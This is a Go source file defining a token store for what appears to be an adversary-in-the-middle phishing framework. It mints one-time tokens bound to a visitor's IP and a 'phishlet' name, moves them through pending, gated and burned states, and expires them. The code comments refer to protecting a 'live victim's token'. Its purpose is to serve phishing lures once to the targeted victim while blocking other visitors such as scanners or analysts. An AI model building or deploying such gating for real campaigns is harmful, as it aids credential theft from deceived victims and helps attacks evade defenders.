package core

import (
	"crypto/rand"
	"encoding/hex"
	"sync"
	"time"
)

type tokenState int

const (
	tokenPending tokenState = iota
	tokenGated
	tokenBurned
)

type pageToken struct {
	IP       string
	Phishlet string
	Created  time.Time
	State    tokenState
}

// TokenStore holds one-time page tokens keyed by 32-hex-char string.
// Tokens move pending -> gated -> burned. A token that fails IP or expiry
// is deleted only if it has expired; a foreign-IP hit never touches a live
// victim's token.
type TokenStore struct {
	mu     sync.Mutex
	tokens map[string]*pageToken
	ttl    time.Duration
	stop   chan struct{}
}

func NewTokenStore(ttl time.Duration) *TokenStore {
	if ttl <= 0 {
		ttl = 20 * time.Minute
	}
	ts := &TokenStore{
		tokens: make(map[string]*pageToken),
		ttl:    ttl,
		stop:   make(chan struct{}),
	}
	go ts.sweeper()
	return ts
}

func (ts *TokenStore) sweeper() {
	t := time.NewTicker(30 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-t.C:
			ts.sweep()
		case <-ts.stop:
			return
		}
	}
}

func (ts *TokenStore) sweep() {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	now := time.Now()
	for k, v := range ts.tokens {
		if now.Sub(v.Created) > ts.ttl {
			delete(ts.tokens, k)
		}
	}
}

func (ts *TokenStore) Mint(ip, phishlet string) string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return ""
	}
	tok := hex.EncodeToString(b)
	ts.mu.Lock()
	ts.tokens[tok] = &pageToken{IP: ip, Phishlet: phishlet, Created: time.Now(), State: tokenPending}
	ts.mu.Unlock()
	return tok
}

func (ts *TokenStore) State(token string) tokenState {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	pt, ok := ts.tokens[token]
	if !ok || time.Since(pt.Created) > ts.ttl {
		return tokenBurned
	}
	return pt.State
}

func (ts *TokenStore) Phishlet(token string) string {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	if pt, ok := ts.tokens[token]; ok && time.Since(pt.Created) <= ts.ttl {
		return pt.Phishlet
	}
	return ""
}

func (ts *TokenStore) MarkGated(token string) {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	if pt, ok := ts.tokens[token]; ok {
		pt.State = tokenGated
	}
}

// Burn moves gated -> burned and returns the phishlet name.
// A token not in gated state, wrong IP, or expired returns "".
func (ts *TokenStore) Burn(token, ip string) string {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	pt, ok := ts.tokens[token]
	if !ok {
		return ""
	}
	if time.Since(pt.Created) > ts.ttl {
		delete(ts.tokens, token)
		return ""
	}
	if pt.IP != ip {
		return ""
	}
	if pt.State != tokenGated {
		return ""
	}
	delete(ts.tokens, token)
	return pt.Phishlet
}

func (ts *TokenStore) Stop() {
	select {
	case <-ts.stop:
	default:
		close(ts.stop)
	}
}